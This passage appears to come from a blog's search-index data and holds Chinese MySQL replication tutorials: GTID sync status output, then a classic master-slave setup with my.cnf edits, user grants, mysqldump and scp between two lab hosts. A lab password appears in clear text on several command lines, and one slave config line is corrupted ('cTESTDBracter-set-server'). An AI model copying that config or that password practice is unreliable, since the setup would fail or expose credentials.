&#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL3&#x300B; | 73 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E; || 7 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL4&#x300B; | 74 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E; || 8 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL5&#x300B; | 75 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E; || 9 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL6&#x300B; | 76 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E; || 10 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL7&#x300B; | 77 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E; || 11 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL8&#x300B; | 78 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E; || 12 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL9&#x300B; | 79 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E; |+---------+-----------------------------------+-------+-----------------------+12 rows in set (0.00 sec)mysql&gt; select * from book2;+-----------------------------------+-------+-------+| name | price | pages |+-----------------------------------+-------+-------+| &#x300A;Linux&#x4ECE;&#x5165;&#x95E8;&#x5230;&#x7CBE;&#x901A;&#x300B; | 30 | 666 || &#x300A;&#x4E91;&#x8BA1;&#x7B97;&#x8D8B;&#x52BF;&#x300B; | 60 | 666 || &#x300A;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x8BBE;&#x8BA1;&#x4E0E;&#x5B9E;&#x73B0;&#x300B; | 80 | 666 || &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL&#x300B; | 166 | 666 |+-----------------------------------+-------+-------+4 rows in set (0.00 sec) &#x67E5;&#x770B;&#x4E3B;&#x5E93;&#x72B6;&#x6001; 1234567mysql&gt; show master status;+------------------+----------+--------------+------------------+-------------------------------------------+| File | Position | Binlog_Do_DB | Binlog_Ignore_DB | Executed_Gtid_Set |+------------------+----------+--------------+------------------+-------------------------------------------+| mysql-bin.000002 | 7389 | | | 03a1eb63-c21a-11ec-b07f-000c2987bea6:1-25 |+------------------+----------+--------------+------------------+-------------------------------------------+1 row in set (0.00 sec) &#x67E5;&#x770B;&#x4ECE;&#x5E93;&#x72B6;&#x6001; 1234567mysql&gt; show master status;+------------------+----------+--------------+------------------+------------------------------------------+| File | Position | Binlog_Do_DB | Binlog_Ignore_DB | Executed_Gtid_Set |+------------------+----------+--------------+------------------+------------------------------------------+| mysql-bin.000002 | 1584 | | | 03a1eb63-c21a-11ec-b07f-000c2987bea6:1-6 |+------------------+----------+--------------+------------------+------------------------------------------+1 row in set (0.00 sec) &#x4ECE;&#x5E93;&#x5F00;&#x542F;&#x4E3B;&#x4ECE;&#x540C;&#x6B65;&#x67E5;&#x770B;&#x662F;&#x5426;&#x540C;&#x6B65; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128mysql&gt; start slave;Query OK, 0 rows affected (0.00 sec)mysql&gt; show slave status\\G*************************** 1. row *************************** Slave_IO_State: Waiting for master to send event Master_Host: 192.168.10.11 Master_User: Jaking Master_Port: 3306 Connect_Retry: 60 Master_Log_File: mysql-bin.000002 Read_Master_Log_Pos: 7389 Relay_Log_File: server12-relay-bin.000003 Relay_Log_Pos: 6223 Relay_Master_Log_File: mysql-bin.000002 Slave_IO_Running: Yes Slave_SQL_Running: Yes Replicate_Do_DB: Replicate_Ignore_DB: Replicate_Do_Table: Replicate_Ignore_Table: Replicate_Wild_Do_Table: Replicate_Wild_Ignore_Table: Last_Errno: 0 Last_Error: Skip_Counter: 0 Exec_Master_Log_Pos: 7389 Relay_Log_Space: 8112 Until_Condition: None Until_Log_File: Until_Log_Pos: 0 Master_SSL_Allowed: No Master_SSL_CA_File: Master_SSL_CA_Path: Master_SSL_Cert: Master_SSL_Cipher: Master_SSL_Key: Seconds_Behind_Master: 0Master_SSL_Verify_Server_Cert: No Last_IO_Errno: 0 Last_IO_Error: Last_SQL_Errno: 0 Last_SQL_Error: Replicate_Ignore_Server_Ids: Master_Server_Id: 11 Master_UUID: 03a1eb63-c21a-11ec-b07f-000c2987bea6 Master_Info_File: /var/lib/mysql/master.info SQL_Delay: 0 SQL_Remaining_Delay: NULL Slave_SQL_Running_State: Slave has read all relay log; waiting for more updates Master_Retry_Count: 86400 Master_Bind: Last_IO_Error_Timestamp: Last_SQL_Error_Timestamp: Master_SSL_Crl: Master_SSL_Crlpath: Retrieved_Gtid_Set: 03a1eb63-c21a-11ec-b07f-000c2987bea6:1-25 Executed_Gtid_Set: 03a1eb63-c21a-11ec-b07f-000c2987bea6:1-25 Auto_Position: 1 Replicate_Rewrite_DB: Channel_Name: Master_TLS_Version: 1 row in set (0.00 sec)mysql&gt; show databases;+--------------------+| Database |+--------------------+| information_schema || BOOK || mysql || performance_schema || sys || testbookdb |+--------------------+6 rows in set (0.00 sec)mysql&gt; use testbookdb;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedmysql&gt; show tables;+----------------------+| Tables_in_testbookdb |+----------------------+| book1 || book2 |+----------------------+2 rows in set (0.00 sec)mysql&gt; select * from book1;+---------+-----------------------------------+-------+-----------------------+| bTypeId | bName | price | publishing |+---------+-----------------------------------+-------+-----------------------+| 1 | &#x300A;Linux&#x4ECE;&#x5165;&#x95E8;&#x5230;&#x7CBE;&#x901A;&#x300B; | 66 | &#x7535;&#x5B50;&#x5DE5;&#x4E1A;&#x51FA;&#x7248;&#x793E; || 2 | &#x300A;&#x4E91;&#x8BA1;&#x7B97;&#x8D8B;&#x52BF;&#x300B; | 68 | &#x4EBA;&#x6C11;&#x90AE;&#x7535;&#x51FA;&#x7248;&#x793E; || 3 | &#x300A;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x8BBE;&#x8BA1;&#x4E0E;&#x5B9E;&#x73B0;&#x300B; | 90 | &#x673A;&#x68B0;&#x5DE5;&#x4E1A;&#x51FA;&#x7248;&#x793E; || 4 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL&#x300B; | 71 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E; || 5 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL2&#x300B; | 72 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E; || 6 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL3&#x300B; | 73 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E; || 7 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL4&#x300B; | 74 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E; || 8 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL5&#x300B; | 75 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E; || 9 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL6&#x300B; | 76 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E; || 10 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL7&#x300B; | 77 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E; || 11 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL8&#x300B; | 78 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E; || 12 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL9&#x300B; | 79 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E; |+---------+-----------------------------------+-------+-----------------------+12 rows in set (0.00 sec)mysql&gt; select * from book2;+-----------------------------------+-------+-------+| name | price | pages |+-----------------------------------+-------+-------+| &#x300A;Linux&#x4ECE;&#x5165;&#x95E8;&#x5230;&#x7CBE;&#x901A;&#x300B; | 30 | 666 || &#x300A;&#x4E91;&#x8BA1;&#x7B97;&#x8D8B;&#x52BF;&#x300B; | 60 | 666 || &#x300A;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x8BBE;&#x8BA1;&#x4E0E;&#x5B9E;&#x73B0;&#x300B; | 80 | 666 || &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL&#x300B; | 166 | 666 |+-----------------------------------+-------+-------+4 rows in set (0.00 sec)mysql&gt; show master status;+------------------+----------+--------------+------------------+-------------------------------------------+| File | Position | Binlog_Do_DB | Binlog_Ignore_DB | Executed_Gtid_Set |+------------------+----------+--------------+------------------+-------------------------------------------+| mysql-bin.000002 | 7113 | | | 03a1eb63-c21a-11ec-b07f-000c2987bea6:1-25 |+------------------+----------+--------------+------------------+-------------------------------------------+1 row in set (0.00 sec) document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"MySQL传统主从同步","date":"2022-06-07T04:44:52.000Z","path":"/posts/607e4760/","text":"&#x73AF;&#x5883; &#x4E3B;&#x673A;&#x540D; IP &#x7CFB;&#x7EDF;/MySQL&#x7248;&#x672C; &#x89D2;&#x8272; MySQL_1 192.168.10.67 RHEL7.3/MySQL5.7 Master MySQL_2 192.168.10.68 RHEL7.3/MySQL5.7 Slave &#x539F;&#x7406; 1)&#x3001;&#x5728;master&#x673A;&#x5668;&#x4E0A;&#x7684;&#x64CD;&#x4F5C;&#xFF1A; &#x3000; &#x5F53;master&#x4E0A;&#x7684;&#x6570;&#x636E;&#x53D1;&#x751F;&#x53D8;&#x5316;&#x65F6;&#xFF0C;&#x8BE5;&#x4E8B;&#x4EF6;&#x53D8;&#x5316;&#x4F1A;&#x6309;&#x7167;&#x987A;&#x5E8F;&#x5199;&#x5165;bin-log&#x4E2D;&#x3002;&#x5F53;slave&#x94FE;&#x63A5;&#x5230;master&#x7684;&#x65F6;&#x5019;&#xFF0C;master&#x673A;&#x5668;&#x4F1A;&#x4E3A;slave&#x5F00;&#x542F;binlog dump&#x7EBF;&#x7A0B;&#x3002;&#x5F53;master&#x7684;binlog&#x53D1;&#x751F;&#x53D8;&#x5316;&#x7684;&#x65F6;&#x5019;&#xFF0C;bin-log dump&#x7EBF;&#x7A0B;&#x4F1A;&#x901A;&#x77E5;slave&#xFF0C;&#x5E76;&#x5C06;&#x76F8;&#x5E94;&#x7684;binlog&#x5185;&#x5BB9;&#x53D1;&#x9001;&#x7ED9;slave&#x3002; 2)&#x3001;&#x5728;slave&#x673A;&#x5668;&#x4E0A;&#x64CD;&#x4F5C;&#xFF1A; &#x3000; &#x5F53;&#x4E3B;&#x4ECE;&#x540C;&#x6B65;&#x5F00;&#x542F;&#x7684;&#x65F6;&#x5019;&#xFF0C;slave&#x4E0A;&#x4F1A;&#x521B;&#x5EFA;&#x4E24;&#x4E2A;&#x7EBF;&#x7A0B;&#xFF1A;I/O&#x7EBF;&#x7A0B;&#x3002;&#x8BE5;&#x7EBF;&#x7A0B;&#x8FDE;&#x63A5;&#x5230;master&#x673A;&#x5668;&#xFF0C;master&#x673A;&#x5668;&#x4E0A;&#x7684;binlog dump &#x7EBF;&#x7A0B;&#x4F1A;&#x5C06;binlog&#x7684;&#x5185;&#x5BB9;&#x53D1;&#x9001;&#x7ED9;&#x8BE5;I/O&#x7EBF;&#x7A0B;&#x3002;&#x8BE5;I/O&#x7EBF;&#x7A0B;&#x63A5;&#x6536;&#x5230;binlog&#x5185;&#x5BB9;&#x540E;&#xFF0C;&#x518D;&#x5C06;&#x5185;&#x5BB9;&#x5199;&#x5165;&#x5230;&#x672C;&#x5730;&#x7684;relay log&#xFF1B;sql&#x7EBF;&#x7A0B;&#x3002;&#x8BE5;&#x7EBF;&#x7A0B;&#x8BFB;&#x53D6;&#x5230;I/O&#x7EBF;&#x7A0B;&#x5199;&#x5165;&#x7684;relay log&#x3002;&#x5E76;&#x4E14;&#x6839;&#x636E;replay log&#x3002;&#x5E76;&#x4E14;&#x6839;&#x636E;relay log &#x7684;&#x5185;&#x5BB9;&#x5BF9;slave&#x6570;&#x636E;&#x5E93;&#x505A;&#x76F8;&#x5E94;&#x7684;&#x64CD;&#x4F5C;&#x3002; 3)&#x3001;MySQL&#x4E3B;&#x4ECE;&#x540C;&#x6B65;&#x539F;&#x7406;&#x56FE;&#x5982;&#x4E0B;: &#x4ECE;&#x5E93;&#x751F;&#x6210;&#x4E24;&#x4E2A;&#x7EBF;&#x7A0B;&#xFF0C;&#x4E00;&#x4E2A;I/O&#x7EBF;&#x7A0B;&#xFF0C;&#x4E00;&#x4E2A;SQL&#x7EBF;&#x7A0B;&#xFF1B;I/O&#x7EBF;&#x7A0B;&#x53BB;&#x8BF7;&#x6C42;&#x4E3B;&#x5E93;&#x7684;binlog&#xFF0C;&#x5E76;&#x5C06;&#x5F97;&#x5230;&#x7684;binlog&#x65E5;&#x5FD7;&#x5199;&#x5230;relay log&#xFF08;&#x4E2D;&#x7EE7;&#x65E5;&#x5FD7;&#xFF09; &#x6587;&#x4EF6;&#x4E2D;&#xFF1B;&#x4E3B;&#x5E93;&#x4F1A;&#x751F;&#x6210;&#x4E00;&#x4E2A; log dump &#x7EBF;&#x7A0B;&#xFF0C;&#x7528;&#x6765;&#x7ED9;&#x4ECE;&#x5E93;I/O&#x7EBF;&#x7A0B;&#x4F20;binlog&#xFF1B;SQL &#x7EBF;&#x7A0B;&#xFF0C;&#x4F1A;&#x8BFB;&#x53D6;relay log&#x6587;&#x4EF6;&#x4E2D;&#x7684;&#x65E5;&#x5FD7;&#xFF0C;&#x5E76;&#x89E3;&#x6790;&#x6210;&#x5177;&#x4F53;&#x64CD;&#x4F5C;&#xFF0C;&#x6765;&#x5B9E;&#x73B0;&#x4E3B;&#x4ECE;&#x7684;&#x64CD;&#x4F5C;&#x4E00;&#x81F4;&#xFF0C;&#x800C;&#x6700;&#x7EC8;&#x6570;&#x636E;&#x4E00;&#x81F4;&#xFF1B; &#x6CE8;&#x610F;&#xFF1A;&#x642D;&#x5EFA;MySQL&#x4E3B;&#x4ECE;&#x540C;&#x6B65;&#x524D;&#xFF0C;&#x9700;&#x8981;&#x5206;&#x522B;&#x5728;&#x4E3B;&#x6570;&#x636E;&#x548C;&#x4ECE;&#x6570;&#x636E;&#x4E0A;&#x5B89;&#x88C5;&#x5E76;&#x914D;&#x7F6E;&#x597D;MySQL&#x6570;&#x636E;&#x5E93;&#xFF01; &#x914D;&#x7F6E; Master 192.168.10.67&#x914D;&#x7F6E; /etc/my.cnf123456789101112131415161718192021222324252627282930[root@MySQL1&#xA0;mysql&#x2010;5.7.19]#&#xA0;vim&#xA0;/etc/my.cnf[client]port=3306socket=/data/mysql/mysql.sock[mysqld] character&#x2010;set&#x2010;server=utf8collation&#x2010;server=utf8_general_ciskip&#x2010;name&#x2010;resolveuser=mysqlport=3306basedir=/usr/local/mysql57datadir=/data/mysqltmpdir=/tmpsocket=/data/mysql/mysql.socklog&#x2010;error=/data/mysql/mysqld.logpid&#x2010;file=/data/mysql/mysqld.pidlog&#x2010;bin=mysql&#x2010;bin&#x2010;master&#xA0;#&#x542F;&#x7528;&#x4E8C;&#x8FDB;&#x5236;&#x65E5;&#x5FD7;binlog_format=mixedserver&#x2010;id=1&#xA0;#&#x672C;&#x673A;&#x6570;&#x636E;&#x5E93;ID&#xA0;&#x6807;&#x793A;binlog&#x2010;do&#x2010;db=TESTDB&#xA0;#&#x53EF;&#x4EE5;&#x88AB;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#x590D;&#x5236;&#x7684;&#x5E93;,&#xA0;&#x4E8C;&#x8FDB;&#x5236;&#x9700;&#x8981;&#x540C;&#x6B65;&#x7684;&#x6570;&#x636E;&#x5E93;&#x540D;binlog&#x2010;ignore&#x2010;db=mysql&#xA0;#&#x4E0D;&#x53EF;&#x4EE5;&#x88AB;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#x590D;&#x5236;&#x7684;&#x5E93;lower_case_table_names=1#&#x6CE8;&#x610F;&#xFF1A;Linux&#x4E0B;&#x90E8;&#x7F72;&#x5B89;&#x88C5;MySQL&#xFF0C;&#x9ED8;&#x8BA4;&#x4E0D;&#x5FFD;&#x7565;&#x8868;&#x540D;&#x5927;&#x5C0F;&#x5199;&#xFF0C;&#x9700;&#x8981;&#x624B;&#x52A8;&#x5230;/etc/my.cnf&#xA0;&#x4E0B;&#x914D;&#x7F6E;&#xA0;lower_case_table_names=1&#xA0;&#x4F7F;Linux&#x73AF;&#x5883;&#x4E0B;MySQL&#x5FFD;&#x7565;&#x8868;&#x540D;&#x5927;&#x5C0F;&#x5199;&#xFF0C;&#x5426;&#x5219;&#x4F7F;&#x7528;MyCAT&#x7684;&#x65F6;&#x5019;&#x4F1A;&#x63D0;&#x793A;&#x627E;&#x4E0D;&#x5230;&#x8868;&#x7684;&#x9519;&#x8BEF;&#xFF01; ~ ~&quot;/etc/my.cnf&quot;&#xA0;24L,&#xA0;556C&#xA0;written 123[root@MySQL1&#xA0;~]#&#xA0;service&#xA0;mysqld&#xA0;restartShutting&#xA0;down&#xA0;MySQL...........&#xA0;SUCCESS!Starting&#xA0;MySQL.&#xA0;SUCCESS! &#x521B;&#x5EFA;&#x8981;&#x540C;&#x6B65;&#x7684;&#x6570;&#x636E;&#x5E93;&#x5E76;&#x521B;&#x5EFA;&#x8868;123456789101112131415161718192021222324252627[root@MySQL1&#xA0;mysql&#x2010;5.7.19]#&#xA0;mysql -uroot -pJaking@vip.163.commysql&gt;CREATE DATABASE TESTDB;show databases;use TESTDB;CREATE TABLE TABLE666 (bTypeId int,bName char(16),price int,publishing char(16));mysql&gt; CREATE DATABASE TESTDB;Query OK, 1 row affected (0.00 sec)mysql&gt; show databases;+--------------------+| Database |+--------------------+| information_schema || mysql || performance_schema || sys || testdb |+--------------------+5 rows in set (0.00 sec)mysql&gt; use TESTDB;Database changedmysql&gt; CREATE TABLE TABLE666 (bTypeId int,bName char(16),price int,publishing char(16));Query OK, 0 rows affected (0.01 sec) &#x6388;&#x6743;12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364[root@MySQL1&#xA0;mysql&#x2010;5.7.19]#&#xA0;mysql -uroot -pJaking@vip.163.com#&#x5982;&#x679C;&#x63D0;&#x793A;&#xA0;mysql&#xA0;&#x547D;&#x4EE4;&#x4E0D;&#x5B58;&#x5728;&#xFF0C;&#x8BF7;&#x5C1D;&#x8BD5;&#x7528;&#xA0;/usr/local/mysql57/bin/mysql&#xA0;&#x2010;uroot&#xA0;&#x2010;p&quot;Jaking@vip.163.com&quot;&#xA0;&#x6765;&#x767B;&#x5F55;MySQL&#x6570;&#x636E;&#x5E93;mysql:&#xA0;[Warning]&#xA0;Using&#xA0;a&#xA0;password&#xA0;on&#xA0;the&#xA0;command&#xA0;line&#xA0;interface&#xA0;can&#xA0;be&#xA0;insecure.Welcome&#xA0;to&#xA0;the&#xA0;MySQL&#xA0;monitor.&#xA0;Commands&#xA0;end&#xA0;with&#xA0;;&#xA0;or&#xA0;\\g.Your&#xA0;MySQL&#xA0;connection&#xA0;id&#xA0;is&#xA0;3Server&#xA0;version:&#xA0;5.7.19&#x2010;log&#xA0;Source&#xA0;distributionCopyright&#xA0;(c)&#xA0;2000,&#xA0;2017,&#xA0;Oracle&#xA0;and/or&#xA0;its&#xA0;affiliates.&#xA0;All&#xA0;rights&#xA0;reserved.Oracle&#xA0;is&#xA0;a&#xA0;registered&#xA0;trademark&#xA0;of&#xA0;Oracle&#xA0;Corporation&#xA0;and/or&#xA0;itsaffiliates.&#xA0;Other&#xA0;names&#xA0;may&#xA0;be&#xA0;trademarks&#xA0;of&#xA0;their&#xA0;respective owners.Type&#xA0;&apos;help;&apos;&#xA0;or&#xA0;&apos;\\h&apos;&#xA0;for&#xA0;help.&#xA0;Type&#xA0;&apos;\\c&apos;&#xA0;to&#xA0;clear&#xA0;the&#xA0;current&#xA0;input&#xA0;statement.mysql&gt;&#xA0;grant replication slave on *.* to slave@&quot;192.168.10.%&quot; identified by &quot;Jaking@vip.163.com&quot;;Query&#xA0;OK,&#xA0;0&#xA0;rows&#xA0;affected,&#xA0;1&#xA0;warning&#xA0;(0.01&#xA0;sec)mysql&gt; show master status;+-------------------------+----------+--------------+------------------+-------------------+| File | Position | Binlog_Do_DB | Binlog_Ignore_DB | Executed_Gtid_Set |+-------------------------+----------+--------------+------------------+-------------------+| mysql-bin-master.000002 | 154 | TESTDB | mysql | |+-------------------------+----------+--------------+------------------+-------------------+1 row in set (0.00 sec)mysql&gt; show binlog events\\G*************************** 1. row *************************** Log_name: mysql-bin-master.000001 Pos: 4 Event_type: Format_desc Server_id: 11End_log_pos: 123 Info: Server ver: 5.7.24-log, Binlog ver: 4*************************** 2. row *************************** Log_name: mysql-bin-master.000001 Pos: 123 Event_type: Previous_gtids Server_id: 11End_log_pos: 154 Info: *************************** 3. row *************************** Log_name: mysql-bin-master.000001 Pos: 154 Event_type: Stop Server_id: 11End_log_pos: 177 Info: 3 rows in set (0.00 sec)mysql&gt; flush privileges;Query OK, 0 rows affected (0.00 sec)mysql&gt; exitBye[root@MySQL1 ~]# ls /var/lib/mysqlauto.cnf ib_logfile1 performance_schemaca-key.pem ibtmp1 private_key.pemca.pem mysql public_key.pemclient-cert.pem mysql-bin-master.000001 server-cert.pemclient-key.pem mysql-bin-master.000002 server-key.pemib_buffer_pool mysql-bin-master.index sysibdata1 mysql.sock testdbib_logfile0 mysql.sock.lock[root@MySQL1 ~]# &#x5BFC;&#x51FA;&#x6570;&#x636E;&#x5E93;&#x5E76;&#x4F20;&#x7ED9;&#x4ECE;&#x670D;&#x52A1;&#x5668; 1234567891011121314151617181920212223[root@MySQL1&#xA0;mysql&#x2010;5.7.19]#&#xA0;mysqldump -uroot -pJaking@vip.163.com -B TESTDB &gt; TESTDB.sqlmysqldump:&#xA0;[Warning]&#xA0;Using&#xA0;a&#xA0;password&#xA0;on&#xA0;the&#xA0;command&#xA0;line&#xA0;interface&#xA0;can&#xA0;be&#xA0;insecure.[root@MySQL1&#xA0;mysql&#x2010;5.7.19]#&#xA0;lsBUILD&#xA0;CPackConfig.cmake&#xA0;install_manifest.txt&#xA0;mysys&#xA0;storageclient&#xA0;CPackSourceConfig.cmake&#xA0;libbinlogevents&#xA0;mysys_ssl&#xA0;stringscmake&#xA0;CTestTestfile.cmake&#xA0;libbinlogstandalone&#xA0;packaging&#xA0;support&#x2010;filesCMakeCache.txt&#xA0;dbug&#xA0;libevent&#xA0;plugin&#xA0;testclientsCMakeFiles&#xA0;Docs&#xA0;libmysql&#xA0;rapid&#xA0;unittestcmake_install.cmake&#xA0;Doxyfile&#x2010;perfschema&#xA0;libmysqld&#xA0;README&#xA0;VERSIONCMakeLists.txt&#xA0;extra&#xA0;libservices&#xA0;regex&#xA0;VERSION.depcmd&#x2010;line&#x2010;utils&#xA0;TESTDB.sql&#xA0;make_dist.cmake&#xA0;scripts&#xA0;vioconfig.h.cmake&#xA0;include&#xA0;Makefile&#xA0;source_downloads&#xA0;winconfigure.cmake&#xA0;info_macros.cmake&#xA0;man&#xA0;sql&#xA0;zlibCOPYING&#xA0;INSTALL&#xA0;mysql&#x2010;test&#xA0;sql&#x2010;common[root@MySQL1&#xA0;mysql&#x2010;5.7.19]#&#xA0;scp&#xA0;TESTDB.sql&#xA0;192.168.10.68:/rootThe&#xA0;authenticity&#xA0;of&#xA0;host&#xA0;&apos;192.168.10.68&#xA0;(192.168.10.68)&apos;&#xA0;can&apos;t&#xA0;be&#xA0;established.ECDSA&#xA0;key&#xA0;fingerprint&#xA0;is 57:3d:7f:91:5a:bc:6f:a1:88:4f:d2:fc:17:0e:51:8b.Are&#xA0;you&#xA0;sure&#xA0;you&#xA0;want&#xA0;to&#xA0;continue&#xA0;connecting&#xA0;(yes/no)?&#xA0;yesWarning:&#xA0;Permanently&#xA0;added&#xA0;&apos;192.168.10.68&apos;&#xA0;(ECDSA)&#xA0;to&#xA0;the&#xA0;list&#xA0;of&#xA0;knownhosts.root@192.168.10.68&apos;s&#xA0;password:TESTDB.sql&#xA0;100%&#xA0;1765&#xA0;1.7KB/s&#xA0;00:00 &#x914D;&#x7F6E; Slave 192.168.10.68&#x914D;&#x7F6E; /etc/my.cnf123456789101112131415161718192021222324252627[root@MySQL2&#xA0;~]#&#xA0;vim&#xA0;/etc/my.cnf[client]port=3306socket=/data/mysql/mysql.sock[mysqld]cTESTDBracter&#x2010;set&#x2010;server=utf8collation&#x2010;server=utf8_general_ciskip&#x2010;name&#x2010;resolveuser=mysqlport=3306basedir=/usr/local/mysql57datadir=/data/mysqltmpdir=/tmpsocket=/data/mysql/mysql.socklog&#x2010;error=/data/mysql/mysqld.logpid&#x2010;file=/data/mysql/mysqld.pidserver&#x2010;id=2#&#x4ECE;&#x670D;&#x52A1;&#x5668;ID&#x53F7;&#xFF0C;&#x4E0D;&#x8981;&#x548C;&#x4E3B;ID&#x76F8;&#x540C;&#xA0;&#xFF0C;&#x5982;&#x679C;&#x8BBE;&#x7F6E;&#x591A;&#x4E2A;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x6BCF;&#x4E2A;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#x5FC5;&#x987B;&#x6709;&#x4E00;&#x4E2A;&#x552F;&#x4E00;&#x7684;server&#x2010;id&#x503C;&#xFF0C;&#x5FC5;&#x987B;&#x4E0E;&#x4E3B;&#x670D;&#x52A1;&#x5668;&#x7684;&#x4EE5;&#x53CA;&#x5176;&#x5B83;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#x7684;&#x4E0D;&#x76F8;&#x540C;&#x3002;&#x53EF;&#x4EE5;&#x8BA4;&#x4E3A;server&#x2010;id&#x503C;&#x7C7B;&#x4F3C;&#x4E8E;IP&#x5730;&#x5740;&#xFF1A;&#x8FD9;&#x4E9B;ID&#x503C;&#x80FD;&#x552F;&#x4E00;&#x8BC6;&#x522B;&#x590D;&#x5236;&#x670D;&#x52A1;&#x5668;&#x7FA4;&#x96C6;&#x4E2D;&#x7684;&#x6BCF;&#x4E2A;&#x670D;&#x52A1;&#x5668;&#x5B9E;&#x4F8B;&#x3002;lower_case_table_names=1#&#x6CE8;&#x610F;&#xFF1A;Linux&#x4E0B;&#x90E8;&#x7F72;&#x5B89;&#x88C5;MySQL&#xFF0C;&#x9ED8;&#x8BA4;&#x4E0D;&#x5FFD;&#x7565;&#x8868;&#x540D;&#x5927;&#x5C0F;&#x5199;&#xFF0C;&#x9700;&#x8981;&#x624B;&#x52A8;&#x5230;/etc/my.cnf&#xA0;&#x4E0B;&#x914D;&#x7F6E;&#xA0;lower_case_table_names=1&#xA0;&#x4F7F;Linux&#x73AF;&#x5883;&#x4E0B;MySQL&#x5FFD;&#x7565;&#x8868;&#x540D;&#x5927;&#x5C0F;&#x5199;&#xFF0C;&#x5426;&#x5219;&#x4F7F;&#x7528;MyCAT&#x7684;&#x65F6;&#x5019;&#x4F1A;&#x63D0;&#x793A;&#x627E;&#x4E0D;&#x5230;&#x8868;&#x7684;&#x9519;&#x8BEF;&#xFF01;~~&quot;/etc/my.cnf&quot;&#xA0;20L,&#xA0;649C&#xA0;written 123[root@MySQL2&#xA0;~]#&#xA0;service&#xA0;mysqld&#xA0;restartShutting&#xA0;down&#xA0;MySQL..&#xA0;[&#xA0;OK&#xA0;]Starting&#xA0;MySQL.&#xA0;[&#xA0;OK&#xA0;] &#x4E24;&#x53F0;&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x5668;mysql&#x7248;&#x672C;&#x8981;&#x4E00;&#x81F4; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162[root@MySQL1&#xA0;~]#&#xA0;mysql&#xA0;&#x2010;uroot&#xA0;&#x2010;pJaking@vip.163.commysql:&#xA0;[Warning]&#xA0;Using&#xA0;a&#xA0;password&#xA0;on&#xA0;the&#xA0;command&#xA0;line&#xA0;interface&#xA0;can&#xA0;be&#xA0;insecure.Welcome&#xA0;to&#xA0;the&#xA0;MySQL&#xA0;monitor.&#xA0;Commands&#xA0;end&#xA0;with&#xA0;;&#xA0;or&#xA0;\\g.Your&#xA0;MySQL&#xA0;connection&#xA0;id&#xA0;is&#xA0;21Server&#xA0;version:&#xA0;5.7.19&#x2010;log&#xA0;Source&#xA0;distributionCopyright&#xA0;(c)&#xA0;2000,&#xA0;2017,&#xA0;Oracle&#xA0;and/or&#xA0;its&#xA0;affiliates.&#xA0;All&#xA0;rights&#xA0;reserved.Oracle&#xA0;is&#xA0;a&#xA0;registered&#xA0;trademark&#xA0;of&#xA0;Oracle&#xA0;Corporation&#xA0;and/or&#xA0;itsaffiliates.&#xA0;Other&#xA0;names&#xA0;may&#xA0;be&#xA0;trademarks&#xA0;of&#xA0;their&#xA0;respectiveowners.Type&#xA0;&apos;help;&apos;&#xA0;or&#xA0;&apos;\\h&apos;&#xA0;for&#xA0;help.&#xA0;Type&#xA0;&apos;\\c&apos;&#xA0;to&#xA0;clear&#xA0;the&#xA0;current&#xA0;input&#xA0;statement.